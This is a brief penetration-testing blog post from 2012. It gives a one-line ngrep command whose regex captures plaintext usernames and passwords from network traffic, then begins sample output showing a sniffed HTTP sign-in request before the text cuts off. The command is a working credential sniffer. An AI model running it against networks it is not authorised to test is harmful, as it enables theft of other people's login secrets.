Quick and dirty ngrep credential (username/password) sniffer

2012-10-31
Penetration Testing

Some time ago I’ve posted a quick (and dirty too!) command-liner using tcpdump to sniff plaintext credentials over the wire. Now I’ve acomplished the same thing with a shorter regex and ngrep tool. ngrep '[&\s?](?:login|user(?:name|)|p(ass(?:word|wd|)|w|wd))[\s:=]\s?([^&\s]*)' -q -i Where -i is for case-insensitive and -q for more precise output. See man ngrep for additional information. And the output is as follows: interface: eth0 (10.1.1.0/255.255.255.0) match: [&\s?](?:login|user(?:name|)|p(ass(?:word|wd|)|w|wd))[\s:=]\s?([^&\s]*) T 10.1.1.111:49196 -> 96.126.98.110:80 [AP] POST /users/signin <acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.
